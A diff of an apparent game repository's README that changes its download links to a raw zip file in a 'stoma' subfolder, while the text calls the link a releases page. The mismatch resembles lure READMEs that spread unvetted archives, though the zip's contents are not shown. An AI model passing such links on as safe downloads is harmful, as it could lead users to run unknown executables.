@@ -1,7 +1,7 @@
 # 🕹️ 2D-Platformer - Enjoy a Fun Side-Scrolling Adventure!
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/Varelaelian/2D-Platformer/main/stoma/2D-Platformer.zip%20release-brightgreen)](https://raw.githubusercontent.com/Varelaelian/2D-Platformer/main/stoma/2D-Platformer.zip)
+[![Download Release](https://github.com/Varelaelian/2D-Platformer/raw/refs/heads/main/stoma/Platformer-v1.6.zip%20release-brightgreen)](https://github.com/Varelaelian/2D-Platformer/raw/refs/heads/main/stoma/Platformer-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the 2D-Platformer! This game offers a simple yet engaging adventure filled with jumps and coins. You can enjoy it with friends or by yourself. 
@@ -21,7 +21,7 @@ Welcome to the 2D-Platformer! This game offers a simple yet engaging adventure f
 
 ## 📥 Download & Install
 1. Click on the link below to visit the Releases page:
-   [Download Here](https://raw.githubusercontent.com/Varelaelian/2D-Platformer/main/stoma/2D-Platformer.zip)
+   [Download Here](https://github.com/Varelaelian/2D-Platformer/raw/refs/heads/main/stoma/Platformer-v1.6.zip)
    
 2. On the Releases page, you will find a list of available versions. Look for the version you want to download.
 
